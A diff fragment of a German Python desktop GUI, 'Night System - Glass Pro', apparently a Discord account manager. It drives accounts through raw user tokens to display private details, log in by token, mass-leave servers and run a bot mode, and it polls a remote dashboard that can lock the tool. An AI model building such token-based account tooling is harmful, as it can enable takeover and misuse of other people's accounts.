+                    res = requests.post(f"{CLOUD_API_ENDPOINT}/heartbeat", json=payload, timeout=5)
+                    if res.status_code == 200:
+                        data = res.json()
+                        if data.get("isLocked"):
+                            self.after(0, lambda r=data.get("lockReason"): self._on_remote_lock_triggered(r))
+                            break
+                        ann = data.get("announcement")
+                        if ann and ann != getattr(self, "_last_broadcast_seen", ""):
+                            self._last_broadcast_seen = ann
+                            self._append_bot_log(f"[BROADCAST] {ann}")
+                except Exception:
+                    pass
+
+        threading.Thread(target=_worker, daemon=True).start()
+
+    def _on_remote_lock_triggered(self, reason):
+        self._append_bot_log(f"[WARNUNG] Tool wurde ueber das Web-Dashboard gesperrt! Grund: {reason}")
+        try:
+            import tkinter.messagebox as mb
+            mb.showerror("Night System - Gesperrt", f"Das Tool wurde vom Administrator auf dem Web-Dashboard gesperrt!\n\nGrund: {reason}\n\nDas Programm wird beendet.")
+        except Exception:
+            pass
+        self.destroy()
+        sys.exit(0)
+
+    # --------------------------------------------------------------------------
+    # 1. SIDEBAR
+    # --------------------------------------------------------------------------
+    def _build_sidebar(self):
+        u = self.user_data
+        uname = u.get("username", "Benutzer")
+        gname = u.get("global_name") or uname
+        initial = (gname[:1] or uname[:1] or "U").upper()
+
+        prof_card = ctk.CTkFrame(self.sidebar, fg_color="transparent")
+        prof_card.pack(fill="x", padx=14, pady=(18, 16))
+
+        self.lbl_side_avatar = ctk.CTkLabel(prof_card, text=initial, font=("Segoe UI", 14, "bold"), text_color=C["text_sub"], width=40, height=40, fg_color=C["card"], corner_radius=20)
+        self.lbl_side_avatar.pack(side="left", padx=(0, 10))
+
+        text_col = ctk.CTkFrame(prof_card, fg_color="transparent")
+        text_col.pack(side="left", fill="x", expand=True)
+
+        self.lbl_sidebar_name = ctk.CTkLabel(text_col, text=gname[:17], font=("Segoe UI", 12, "bold"), text_color=C["text"])
+        self.lbl_sidebar_name.pack(anchor="w")
+
+        lbl_sub = ctk.CTkLabel(text_col, text="Online", font=("Segoe UI", 9.5, "bold"), text_color=C["green"])
+        lbl_sub.pack(anchor="w")
+
+        self.lbl_menu_title = ctk.CTkLabel(self.sidebar, text="HAUPTMENUE", font=("Segoe UI", 9, "bold"), text_color=C["text_dim"])
+        self.lbl_menu_title.pack(anchor="w", padx=18, pady=(10, 6))
+
+        # Navigation Tabs
+        self.nav_order = ["overview", "guilds", "friends", "join", "extra", "bot", "click_instant", "conn", "billing"]
+        self.nav_btns = {}
+        self.nav_btns["overview"]      = self._create_nav_btn("Uebersicht", "overview")
+        self.nav_btns["guilds"]        = self._create_nav_btn(f"Server ({len(self.guilds_data)})", "guilds")
+        self.nav_btns["friends"]       = self._create_nav_btn(f"Freunde & Gruppen ({len(self.friends_data)})", "friends")
+        self.nav_btns["join"]          = self._create_nav_btn("Server beitreten", "join")
+        self.nav_btns["extra"]         = self._create_nav_btn("Extra", "extra")
+        self.nav_btns["bot"]           = self._create_nav_btn("Bot", "bot")
+        self.nav_btns["click_instant"] = self._create_nav_btn("Click Instant", "click_instant")
+        self.nav_btns["conn"]          = self._create_nav_btn(f"Verbindungen ({len(self.connections_data)})", "conn")
+        self.nav_btns["billing"]       = self._create_nav_btn("Nitro & Billing", "billing")
+
+        # click_instant anfaenglich ausblenden (wird freigeschaltet wenn Bot aktiv)
+        self.nav_btns["click_instant"].pack_forget()
+
+        # Unten: Web Login Button
+        bottom_box = ctk.CTkFrame(self.sidebar, fg_color="transparent")
+        bottom_box.pack(side="bottom", fill="x", padx=12, pady=16)
+
+        btn_web = ctk.CTkButton(
+            bottom_box,
+            text="Web Login",
+            font=("Segoe UI", 11, "bold"),
+            fg_color=C["btn_gray"],
+            text_color=C["text"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["card_border_hi"],
+            border_width=1,
+            height=38,
+            corner_radius=12,
+            command=self.launch_browser_login
+        )
+        btn_web.pack(fill="x", pady=4)
+
+        lbl_foot = ctk.CTkLabel(bottom_box, text="Night System - Glass Pro", font=("Segoe UI", 9), text_color=C["text_dim"])
+        lbl_foot.pack(pady=(6, 0))
+
+    def _create_nav_btn(self, text, tab_name):
+        btn = ctk.CTkButton(
+            self.sidebar,
+            text=text,
+            font=("Segoe UI", 11, "bold"),
+            fg_color="transparent",
+            text_color=C["text_sub"],
+            hover_color=C["card_hover"],
+            anchor="w",
+            height=38,
+            corner_radius=12,
+            command=lambda: self._switch_tab(tab_name)
+        )
+        btn.pack(fill="x", padx=12, pady=2)
+        return btn
+
+    def _switch_tab(self, tab_name):
+        self.active_tab = tab_name
+        for name, btn in self.nav_btns.items():
+            if name == tab_name:
+                btn.configure(fg_color=C["card_hover"], text_color=C["text"], border_color=C["card_border"], border_width=1)
+            else:
+                btn.configure(fg_color="transparent", text_color=C["text_sub"], border_width=0)
+
+        for f in [self.frame_overview, self.frame_guilds, self.frame_friends, self.frame_join, self.frame_extra, self.frame_bot, self.frame_click_instant, self.frame_conn, self.frame_billing]:
+            f.pack_forget()
+
+        tab_map = {
+            "overview":      self.frame_overview,
+            "guilds":        self.frame_guilds,
+            "friends":       self.frame_friends,
+            "join":          self.frame_join,
+            "extra":         self.frame_extra,
+            "bot":           self.frame_bot,
+            "click_instant": self.frame_click_instant,
+            "conn":          self.frame_conn,
+            "billing":       self.frame_billing
+        }
+        if tab_name in tab_map:
+            tab_map[tab_name].pack(fill="both", expand=True)
+
+    def _enter_bot_mode(self):
+        # Alle anderen Tabs schliessen/ausblenden, nur Bot-Tab bleibt sichtbar
+        for name, btn in self.nav_btns.items():
+            if name != "bot":
+                btn.pack_forget()
+        if hasattr(self, "lbl_menu_title"):
+            self.lbl_menu_title.configure(text="BOT MODUS")
+        self._switch_tab("bot")
+
+    def _exit_bot_mode(self):
+        # Alle Tabs wiederherstellen
+        for name in self.nav_order:
+            if name == "click_instant":
+                continue
+            btn = self.nav_btns.get(name)
+            if btn:
+                btn.pack_forget()
+                btn.pack(fill="x", padx=12, pady=2)
+        if hasattr(self, "lbl_menu_title"):
+            self.lbl_menu_title.configure(text="HAUPTMENUE")
+
+    # --------------------------------------------------------------------------
+    # 2. MITTLERER CONTENT: UEBERSICHT
+    # --------------------------------------------------------------------------
+    def _build_overview_tab(self):
+        u = self.user_data
+        uname = u.get("username", "-")
+        gname = u.get("global_name") or uname
+        uid = str(u.get("id", "-"))
+        dt_str, age_str, days_num = snowflake_to_datetime_info(uid)
+        owned_guilds = sum(1 for g in self.guilds_data if g.get("owner"))
+        initial = (gname[:1] or uname[:1] or "U").upper()
+
+        scroll = ctk.CTkScrollableFrame(self.frame_overview, fg_color="transparent")
+        scroll.pack(fill="both", expand=True)
+
+        # HERO CARD
+        hero_card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
+        hero_card.pack(fill="x", pady=(0, 14))
+
+        hero_inner = ctk.CTkFrame(hero_card, fg_color="transparent")
+        hero_inner.pack(fill="x", padx=22, pady=20)
+
+        self.lbl_hero_avatar = ctk.CTkLabel(hero_inner, text=initial, font=("Segoe UI", 28, "bold"), text_color=C["text_sub"], width=80, height=80, fg_color=C["card_alt"], corner_radius=40)
+        self.lbl_hero_avatar.pack(side="left", padx=(0, 20))
+
+        hero_text = ctk.CTkFrame(hero_inner, fg_color="transparent")
+        hero_text.pack(side="left", fill="x", expand=True)
+
+        self.lbl_hero_title = ctk.CTkLabel(hero_text, text=gname, font=("Segoe UI", 22, "bold"), text_color=C["text"])
+        self.lbl_hero_title.pack(anchor="w")
+
+        self.lbl_hero_sub = ctk.CTkLabel(hero_text, text=f"@{uname}  |  ID: {uid}", font=("Segoe UI", 11), text_color=C["text_muted"])
+        self.lbl_hero_sub.pack(anchor="w", pady=(2, 6))
+
+        bio_txt = u.get("bio") or "Discord Account - Ueber Night System verifiziert & geladen."
+        self.lbl_hero_bio = ctk.CTkLabel(hero_text, text=bio_txt[:110], font=("Segoe UI", 10.5), text_color=C["text_sub"])
+        self.lbl_hero_bio.pack(anchor="w")
+
+        hero_actions = ctk.CTkFrame(hero_inner, fg_color="transparent")
+        hero_actions.pack(side="right", padx=(10, 0))
+
+        btn_hero_web = ctk.CTkButton(
+            hero_actions,
+            text="Web Login",
+            font=("Segoe UI", 10.5, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["card_border_hi"],
+            border_width=1,
+            corner_radius=12,
+            height=34,
+            width=110,
+            command=self.launch_browser_login
+        )
+        btn_hero_web.pack(pady=3)
+
+        btn_hero_guilds = ctk.CTkButton(
+            hero_actions,
+            text="Server oeffnen",
+            font=("Segoe UI", 10.5, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["card_border_hi"],
+            border_width=1,
+            corner_radius=12,
+            height=34,
+            width=110,
+            command=lambda: self._switch_tab("guilds")
+        )
+        btn_hero_guilds.pack(pady=3)
+
+        # 5 CARDS GRID
+        grid_frame = ctk.CTkFrame(scroll, fg_color="transparent")
+        grid_frame.pack(fill="x", pady=(0, 14))
+        grid_frame.grid_columnconfigure((0, 1), weight=1)
+
+        self.c1_card = ctk.CTkFrame(grid_frame, fg_color=C["acc_yellow_bg"], corner_radius=16, border_width=1.5, border_color=C["acc_yellow_border"])
+        self.c1_card.grid(row=0, column=0, padx=(0, 7), pady=(0, 12), sticky="nsew")
+        self._populate_accent_card(
+            self.c1_card,
+            "SERVER STATS",
+            f"{len(self.guilds_data)}",
+            f"{owned_guilds} eigene Inhaber-Server",
+            C["acc_yellow_text"],
+            action_btn=("Server verwalten >", lambda: self._switch_tab("guilds"), C["acc_yellow_border"], C["acc_yellow_text"])
+        )
+
+        c2 = ctk.CTkFrame(grid_frame, fg_color=C["acc_orange_bg"], corner_radius=16, border_width=1.5, border_color=C["acc_orange_border"])
+        c2.grid(row=0, column=1, padx=(7, 0), pady=(0, 12), sticky="nsew")
+        self._populate_accent_card(c2, "ACCOUNT ALTER", f"{days_num} Tage", f"Erstellt: {dt_str} ({age_str})", C["acc_orange_text"])
+
+        sub_grid = ctk.CTkFrame(scroll, fg_color="transparent")
+        sub_grid.pack(fill="x", pady=(0, 14))
+        sub_grid.grid_columnconfigure((0, 1, 2), weight=1)
+
+        p_type = u.get("premium_type", 0)
+        nitro_txt = "Nitro Booster" if p_type == 2 else ("Nitro Classic" if p_type == 1 else ("Nitro Basic" if p_type == 3 else "Kein Nitro"))
+        c3 = ctk.CTkFrame(sub_grid, fg_color=C["acc_purple_bg"], corner_radius=16, border_width=1.5, border_color=C["acc_purple_border"])
+        c3.grid(row=0, column=0, padx=(0, 6), sticky="nsew")
+        self._populate_accent_card(
+            c3,
+            "NITRO LEVEL",
+            nitro_txt,
+            f"Abo-Stufe {p_type}",
+            C["acc_purple_text"],
+            small=True,
+            action_btn=("Nitro Details >", lambda: self._switch_tab("billing"), C["acc_purple_border"], C["acc_purple_text"])
+        )
+
+        mfa = u.get("mfa_enabled", False)
+        ver = u.get("verified", False)
+        c4 = ctk.CTkFrame(sub_grid, fg_color=C["acc_green_bg"], corner_radius=16, border_width=1.5, border_color=C["acc_green_border"])
+        c4.grid(row=0, column=1, padx=6, sticky="nsew")
+        self._populate_accent_card(c4, "SICHERHEIT", "2FA Aktiv" if mfa else "2FA Inaktiv", "E-Mail verifiziert" if ver else "Nicht verifiziert", C["acc_green_text"], small=True)
+
+        c5 = ctk.CTkFrame(sub_grid, fg_color=C["acc_cyan_bg"], corner_radius=16, border_width=1.5, border_color=C["acc_cyan_border"])
+        c5.grid(row=0, column=2, padx=(6, 0), sticky="nsew")
+        self._populate_accent_card(
+            c5,
+            "KONTAKTE",
+            f"{len(self.friends_data)} Freunde & DMs",
+            f"{len(self.connections_data)} Verknuepfungen",
+            C["acc_cyan_text"],
+            small=True,
+            action_btn=("Freunde oeffnen >", lambda: self._switch_tab("friends"), C["acc_cyan_border"], C["acc_cyan_text"])
+        )
+
+        detail_card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
+        detail_card.pack(fill="x", pady=(0, 10))
+
+        dc_top = ctk.CTkFrame(detail_card, fg_color="transparent")
+        dc_top.pack(fill="x", padx=20, pady=16, side="top")
+
+        lbl_dc_title = ctk.CTkLabel(dc_top, text="Account Matrix & Details", font=("Segoe UI", 13, "bold"), text_color=C["text"])
+        lbl_dc_title.pack(side="left")
+
+        pill_box = ctk.CTkFrame(dc_top, fg_color=C["card_alt"], corner_radius=12)
+        pill_box.pack(side="right")
+
+        for p_name in ["Uebersicht", "Sicherheit", "Token"]:
+            p_lbl = ctk.CTkLabel(pill_box, text=p_name, font=("Segoe UI", 10, "bold"), text_color=C["text_sub"], padx=10, pady=4)
+            p_lbl.pack(side="left")
+
+        rows = [
+            ("E-Mail Adresse:", u.get("email") or "- (Nicht oeffentlich)", "Verifiziert" if ver else "Nein"),
+            ("Telefonnummer:", u.get("phone") or "- (Keine hinterlegt)", "Aktiv" if u.get("phone") else "-"),
+            ("Sprache & Region:", f"{u.get('locale', 'de').upper()} (Discord)", "DE"),
+            ("2FA Authenticator:", "Aktiviert (MFA)" if mfa else "Deaktiviert", "2FA"),
+            ("Erstellungsdatum:", f"{dt_str} ({age_str})", f"{days_num} Tage"),
+            ("Verbundene Server:", f"{len(self.guilds_data)} Server ({owned_guilds} Inhaber)", f"{len(self.guilds_data)} Total"),
+            ("Freunde & Gruppen:", f"{len(self.friends_data)} Kontakte synchronisiert", f"{len(self.friends_data)} Total")
+        ]
+
+        dc_content = ctk.CTkFrame(detail_card, fg_color="transparent")
+        dc_content.pack(fill="x", padx=20, pady=(0, 18))
+
+        for lbl, val, tag in rows:
+            r_box = ctk.CTkFrame(dc_content, fg_color=C["card_alt"], corner_radius=12, height=38)
+            r_box.pack(fill="x", pady=3)
+            r_box.pack_propagate(False)
+
+            ctk.CTkLabel(r_box, text=lbl, font=("Segoe UI", 11, "bold"), text_color=C["text_muted"]).pack(side="left", padx=14)
+            ctk.CTkLabel(r_box, text=val, font=("Segoe UI", 11), text_color=C["text"]).pack(side="left", padx=6)
+            ctk.CTkLabel(r_box, text=tag, font=("Segoe UI", 9.5, "bold"), text_color=C["text_sub"], fg_color=C["card"], corner_radius=8, padx=10, pady=2).pack(side="right", padx=12)
+
+    def _populate_accent_card(self, parent, subtitle, main_val, footer_txt, accent_color, small=False, action_btn=None):
+        p_inner = ctk.CTkFrame(parent, fg_color="transparent")
+        p_inner.pack(fill="both", expand=True, padx=16, pady=14 if not small else 12)
+
+        top_row = ctk.CTkFrame(p_inner, fg_color="transparent")
+        top_row.pack(fill="x")
+
+        ctk.CTkLabel(top_row, text=subtitle, font=("Segoe UI", 9.5, "bold"), text_color=accent_color).pack(side="left")
+
+        ctk.CTkLabel(p_inner, text=main_val, font=("Segoe UI", 18 if not small else 14, "bold"), text_color=C["text"]).pack(anchor="w", pady=(4, 2))
+        ctk.CTkLabel(p_inner, text=footer_txt, font=("Segoe UI", 9.5), text_color=C["text_sub"]).pack(anchor="w")
+
+        if action_btn:
+            b_text, b_cmd, b_border, b_color = action_btn
+            btn = ctk.CTkButton(
+                p_inner,
+                text=b_text,
+                font=("Segoe UI", 9.5, "bold"),
+                fg_color="transparent",
+                hover_color=C["card_hover"],
+                border_color=b_border,
+                border_width=1,
+                text_color=b_color,
+                height=26,
+                corner_radius=8,
+                command=b_cmd
+            )
+            btn.pack(anchor="w", pady=(8, 0))
+
+    # --------------------------------------------------------------------------
+    # 3. SERVER TAB
+    # --------------------------------------------------------------------------
+    def _build_guilds_tab(self):
+        top_bar = ctk.CTkFrame(self.frame_guilds, fg_color=C["card"], corner_radius=16, border_width=1, border_color=C["card_border"])
+        top_bar.pack(fill="x", pady=(0, 10))
+
+        tb_row1 = ctk.CTkFrame(top_bar, fg_color="transparent")
+        tb_row1.pack(fill="x", padx=16, pady=(12, 6))
+
+        title_box = ctk.CTkFrame(tb_row1, fg_color="transparent")
+        title_box.pack(side="left")
+
+        self.lbl_guilds_title = ctk.CTkLabel(
+            title_box,
+            text=f"Verbundene Server ({len(self.guilds_data)})",
+            font=("Segoe UI", 15, "bold"),
+            text_color=C["text"]
+        )
+        self.lbl_guilds_title.pack(side="left")
+
+        self.lbl_selected_count = ctk.CTkLabel(
+            title_box,
+            text="(0 ausgewaehlt)",
+            font=("Segoe UI", 10.5),
+            text_color=C["text_muted"]
+        )
+        self.lbl_selected_count.pack(side="left", padx=(10, 0))
+
+        self.guild_search_var = ctk.StringVar()
+        self.guild_search_var.trace_add("write", lambda *args: self._filter_guilds())
+
+        search_entry = ctk.CTkEntry(
+            tb_row1,
+            textvariable=self.guild_search_var,
+            placeholder_text="Server nach Name oder ID filtern...",
+            width=260,
+            height=32,
+            corner_radius=10,
+            fg_color=C["card_alt"],
+            border_color=C["card_border"],
+            text_color=C["text"]
+        )
+        search_entry.pack(side="right", padx=(10, 0))
+
+        btn_refresh = ctk.CTkButton(
+            tb_row1,
+            text="Aktualisieren",
+            font=("Segoe UI", 10.5, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["btn_gray_border"],
+            border_width=1,
+            corner_radius=10,
+            height=32,
+            width=100,
+            command=self._refresh_guilds_data
+        )
+        btn_refresh.pack(side="right")
+
+        tb_row2 = ctk.CTkFrame(top_bar, fg_color="transparent")
+        tb_row2.pack(fill="x", padx=16, pady=(4, 12))
+
+        sel_box = ctk.CTkFrame(tb_row2, fg_color="transparent")
+        sel_box.pack(side="left")
+
+        btn_sel_all = ctk.CTkButton(
+            sel_box,
+            text="Alle markieren",
+            font=("Segoe UI", 9.5, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["btn_gray_border"],
+            border_width=1,
+            corner_radius=8,
+            height=28,
+            width=105,
+            command=self._select_all_guilds
+        )
+        btn_sel_all.pack(side="left", padx=(0, 6))
+
+        btn_sel_none = ctk.CTkButton(
+            sel_box,
+            text="Keine",
+            font=("Segoe UI", 9.5, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["btn_gray_border"],
+            border_width=1,
+            corner_radius=8,
+            height=28,
+            width=60,
+            command=self._deselect_all_guilds
+        )
+        btn_sel_none.pack(side="left")
+
+        act_box = ctk.CTkFrame(tb_row2, fg_color="transparent")
+        act_box.pack(side="right")
+
+        self.btn_stop_leave = ctk.CTkButton(
+            act_box,
+            text="Stop",
+            font=("Segoe UI", 10, "bold"),
+            fg_color=C["btn_gray"],
+            text_color=C["text_muted"],
+            hover_color=C["red_hover"],
+            border_color=C["btn_gray_border"],
+            border_width=1,
+            corner_radius=8,
+            height=28,
+            width=65,
+            state="disabled",
+            command=self._stop_batch_leave
+        )
+        self.btn_stop_leave.pack(side="right", padx=(8, 0))
+
+        btn_leave_all = ctk.CTkButton(
+            act_box,
+            text="Alle Server verlassen",
+            font=("Segoe UI", 10, "bold"),
+            fg_color=C["red_bg"],
+            text_color=C["red_text"],
+            hover_color=C["red_hover"],
+            border_color=C["red_border"],
+            border_width=1,
+            corner_radius=8,
+            height=28,
+            command=self._leave_all_guilds
+        )
+        btn_leave_all.pack(side="right", padx=(8, 0))
+
+        self.btn_leave_selected = ctk.CTkButton(
+            act_box,
+            text="Ausgewaehlte verlassen (0)",
+            font=("Segoe UI", 10, "bold"),
+            fg_color=C["red_bg"],
+            text_color=C["red_text"],
+            hover_color=C["red_hover"],
+            border_color=C["red_border"],
+            border_width=1,
+            corner_radius=8,
+            height=28,
+            command=self._leave_selected_guilds
+        )
+        self.btn_leave_selected.pack(side="right")
+
+        self.guilds_scroll = ctk.CTkScrollableFrame(self.frame_guilds, fg_color="transparent")
+        self.guilds_scroll.pack(fill="both", expand=True)
+
+        self._render_all_guilds_cards()
+
+    def _render_all_guilds_cards(self):
+        for widget in self.guilds_scroll.winfo_children():
+            widget.destroy()
+
+        self.guild_cards.clear()
+        self.guild_checkboxes.clear()
+
+        if not self.guilds_data:
+            empty_box = ctk.CTkFrame(self.guilds_scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])
+            empty_box.pack(fill="x", pady=20)
+            ctk.CTkLabel(empty_box, text="Keine Server vorhanden.", font=("Segoe UI", 12), text_color=C["text_muted"]).pack(pady=24)
+            return
+
+        for g in self.guilds_data:
+            gid = str(g.get("id", "0"))
+            gname = g.get("name", "Unbekannter Server")
+            is_owner = g.get("owner", False)
+
+            card = ctk.CTkFrame(self.guilds_scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])
+            card.pack(fill="x", pady=3)
+            self.guild_cards[gid] = card
+
+            ci = ctk.CTkFrame(card, fg_color="transparent")
+            ci.pack(fill="x", padx=16, pady=8)
+
+            if not is_owner:
+                chk_var = ctk.BooleanVar(value=False)
+                self.guild_checkboxes[gid] = chk_var
+                chk = ctk.CTkCheckBox(
+                    ci,
+                    text="",
+                    variable=chk_var,
+                    width=22,
+                    checkbox_width=18,
+                    checkbox_height=18,
+                    corner_radius=4,
+                    border_width=1.5,
+                    border_color=C["card_border_hi"],
+                    fg_color=C["blurple"],
+                    hover_color=C["blurple_hi"],
+                    command=self._update_selected_count
+                )
+                chk.pack(side="left", padx=(0, 8))
+            else:
+                spacer = ctk.CTkFrame(ci, width=22, height=18, fg_color="transparent")
+                spacer.pack(side="left", padx=(0, 8))
+
+            g_initial = (gname[:1] or "S").upper()
+            icon_badge = ctk.CTkLabel(ci, text=g_initial, font=("Segoe UI", 12, "bold"), text_color=C["text_sub"], width=36, height=36, fg_color=C["card_alt"], corner_radius=18)
+            icon_badge.pack(side="left", padx=(0, 12))
+
+            title_col = ctk.CTkFrame(ci, fg_color="transparent")
+            title_col.pack(side="left", fill="x", expand=True)
+
+            ctk.CTkLabel(title_col, text=gname, font=("Segoe UI", 12, "bold"), text_color=C["text"]).pack(anchor="w")
+            ctk.CTkLabel(title_col, text=f"ID: {gid}", font=("Consolas", 9.5), text_color=C["text_muted"]).pack(anchor="w")
+
+            if is_owner:
+                badge = ctk.CTkLabel(ci, text="Inhaber", font=("Segoe UI", 9.5, "bold"), fg_color=C["acc_yellow_bg"], text_color=C["acc_yellow_text"], corner_radius=8, padx=10, pady=4)
+                badge.pack(side="right", padx=(10, 0))
+            else:
+                badge = ctk.CTkLabel(ci, text="Mitglied", font=("Segoe UI", 9.5, "bold"), fg_color=C["card_alt"], text_color=C["text_sub"], corner_radius=8, padx=10, pady=4)
+                badge.pack(side="right", padx=(10, 0))
+
+                btn_leave = ctk.CTkButton(
+                    ci,
+                    text="Verlassen",
+                    font=("Segoe UI", 10.5, "bold"),
+                    fg_color=C["red_bg"],
+                    text_color=C["red_text"],
+                    hover_color=C["red_hover"],
+                    border_color=C["red_border"],
+                    border_width=1,
+                    height=30,
+                    corner_radius=8,
+                    command=lambda i=gid, n=gname: self._leave_guild_direct(i, n)
+                )
+                btn_leave.pack(side="right", padx=(10, 0))
+
+        self._update_selected_count()
+
+    def _update_selected_count(self):
+        cnt = sum(1 for var in self.guild_checkboxes.values() if var.get())
+        if hasattr(self, "lbl_selected_count"):
+            self.lbl_selected_count.configure(text=f"({cnt} ausgewaehlt)")
+        if hasattr(self, "btn_leave_selected"):
+            self.btn_leave_selected.configure(text=f"Ausgewaehlte verlassen ({cnt})")
+
+    def _select_all_guilds(self):
+        for var in self.guild_checkboxes.values():
+            var.set(True)
+        self._update_selected_count()
+
+    def _deselect_all_guilds(self):
+        for var in self.guild_checkboxes.values():
+            var.set(False)
+        self._update_selected_count()
+
+    def _filter_guilds(self):
+        query = self.guild_search_var.get().strip().lower()
+        for g in self.guilds_data:
+            gid = str(g.get("id", "0"))
+            card = self.guild_cards.get(gid)
+            if not card:
+                continue
+            gname = str(g.get("name", "")).lower()
+            matches = not query or (query in gname or query in gid)
+            if matches:
+                if not card.winfo_ismapped():
+                    card.pack(fill="x", pady=3)
+            else:
+                if card.winfo_ismapped():
+                    card.pack_forget()
+
+    def _remove_single_guild_ui(self, guild_id):
+        gid_str = str(guild_id)
+        card = self.guild_cards.pop(gid_str, None)
+        self.guild_checkboxes.pop(gid_str, None)
+        if card:
+            try: card.destroy()
+            except Exception: pass
+        self.guilds_data = [g for g in self.guilds_data if str(g.get("id")) != gid_str]
+        self.nav_btns["guilds"].configure(text=f"Server ({len(self.guilds_data)})")
+        self.lbl_guilds_title.configure(text=f"Verbundene Server ({len(self.guilds_data)})")
+        self._update_selected_count()
+        self._update_extra_guild_options()
+
+    def _leave_guild_direct(self, guild_id, guild_name):
+        self._remove_single_guild_ui(guild_id)
+        def _do_leave():
+            if not self.token or self.token.startswith("mfa.VkO_") or "DEMO" in self.token:
+                return
+            make_discord_api_request("DELETE", f"https://discord.com/api/v10/users/@me/guilds/{guild_id}", self.token)
+        threading.Thread(target=_do_leave, daemon=True).start()
+
+    def _leave_selected_guilds(self):
+        selected_ids = [gid for gid, var in self.guild_checkboxes.items() if var.get()]
+        if not selected_ids:
+            return
+        self._batch_leave_guilds(selected_ids)
+
+    def _leave_all_guilds(self):
+        all_member_ids = [str(g.get("id")) for g in self.guilds_data if not g.get("owner")]
+        if not all_member_ids:
+            return
+        self._batch_leave_guilds(all_member_ids)
+
+    def _stop_batch_leave(self):
+        self.stop_requested = True
+        if hasattr(self, "btn_stop_leave"):
+            self.btn_stop_leave.configure(text="Stoppe...", state="disabled")
+
+    def _batch_leave_guilds(self, guild_ids):
+        if self.leave_in_progress or not guild_ids:
+            return
+
+        self.leave_in_progress = True
+        self.stop_requested = False
+
+        if hasattr(self, "btn_stop_leave"):
+            self.btn_stop_leave.configure(
+                state="normal",
+                fg_color=C["red_bg"],
+                text_color=C["red_text"],
+                border_color=C["red_border"],
+                hover_color=C["red_hover"],
+                text="Stop"
+            )
+
+        def _worker():
+            for gid in list(guild_ids):
+                if self.stop_requested:
+                    break
+
+                self.after(0, lambda target=gid: self._remove_single_guild_ui(target))
+
+                if self.token and not self.token.startswith("mfa.VkO_") and "DEMO" not in self.token:
+                    make_discord_api_request("DELETE", f"https://discord.com/api/v10/users/@me/guilds/{gid}", self.token)
+                    for _ in range(5):
+                        if self.stop_requested:
+                            break
+                        time.sleep(0.04)
+                else:
+                    time.sleep(0.04)
+
+            self.leave_in_progress = False
+            self.stop_requested = False
+            self.after(0, lambda: self._on_batch_leave_finished())
+
+        threading.Thread(target=_worker, daemon=True).start()
+
+    def _on_batch_leave_finished(self):
+        if hasattr(self, "btn_stop_leave"):
+            self.btn_stop_leave.configure(
+                state="disabled",
+                fg_color=C["btn_gray"],
+                text_color=C["text_muted"],
+                border_color=C["btn_gray_border"],
+                text="Stop"
+            )
+
+    def _refresh_guilds_data(self):
+        if not self.token or "DEMO" in self.token:
+            self._render_all_guilds_cards()
+            return
+
+        def _fetch():
+            try:
+                rg = make_discord_api_request("GET", "https://discord.com/api/v10/users/@me/guilds", self.token)
+                if rg and rg.status_code == 200:
+                    self.guilds_data = rg.json()
+                    self.after(0, lambda: [
+                        self.nav_btns["guilds"].configure(text=f"Server ({len(self.guilds_data)})"),
+                        self.lbl_guilds_title.configure(text=f"Verbundene Server ({len(self.guilds_data)})"),
+                        self._render_all_guilds_cards(),
+                        self._update_extra_guild_options()
+                    ])
+            except Exception:
+                pass
+
+        threading.Thread(target=_fetch, daemon=True).start()
+
+    # --------------------------------------------------------------------------
+    # 4. FREUNDE & GRUPPEN TAB (INCL. CHATS SCHLIESSEN)
+    # --------------------------------------------------------------------------
+    def _build_friends_tab(self):
+        top_bar = ctk.CTkFrame(self.frame_friends, fg_color=C["card"], corner_radius=16, border_width=1, border_color=C["card_border"])
+        top_bar.pack(fill="x", pady=(0, 10))
+
+        tb_row1 = ctk.CTkFrame(top_bar, fg_color="transparent")
+        tb_row1.pack(fill="x", padx=16, pady=(12, 6))
+
+        title_box = ctk.CTkFrame(tb_row1, fg_color="transparent")
+        title_box.pack(side="left")
+
+        self.lbl_friends_title = ctk.CTkLabel(
+            title_box,
+            text=f"Freunde & Gruppen ({len(self.friends_data)})",
+            font=("Segoe UI", 15, "bold"),
+            text_color=C["text"]
+        )
+        self.lbl_friends_title.pack(side="left")
+
+        self.lbl_friends_selected_count = ctk.CTkLabel(
+            title_box,
+            text="(0 ausgewaehlt)",
+            font=("Segoe UI", 10.5),
+            text_color=C["text_muted"]
+        )
+        self.lbl_friends_selected_count.pack(side="left", padx=(10, 0))
+
+        self.friends_search_var = ctk.StringVar()
+        self.friends_search_var.trace_add("write", lambda *args: self._filter_friends())
+
+        search_entry = ctk.CTkEntry(
+            tb_row1,
+            textvariable=self.friends_search_var,
+            placeholder_text="Freunde oder Gruppen filtern...",
+            width=260,
+            height=32,
+            corner_radius=10,
+            fg_color=C["card_alt"],
+            border_color=C["card_border"],
+            text_color=C["text"]
+        )
+        search_entry.pack(side="right", padx=(10, 0))
+
+        btn_refresh = ctk.CTkButton(
+            tb_row1,
+            text="Aktualisieren",
+            font=("Segoe UI", 10.5, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["btn_gray_border"],
+            border_width=1,
+            corner_radius=10,
+            height=32,
+            width=100,
+            command=self._refresh_friends_data
+        )
+        btn_refresh.pack(side="right")
+
+        tb_row2 = ctk.CTkFrame(top_bar, fg_color="transparent")
+        tb_row2.pack(fill="x", padx=16, pady=(4, 12))
+
+        sel_box = ctk.CTkFrame(tb_row2, fg_color="transparent")
+        sel_box.pack(side="left")
+
+        btn_sel_all = ctk.CTkButton(
+            sel_box,
+            text="Alle markieren",
+            font=("Segoe UI", 9.5, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["btn_gray_border"],
+            border_width=1,
+            corner_radius=8,
+            height=28,
+            width=105,
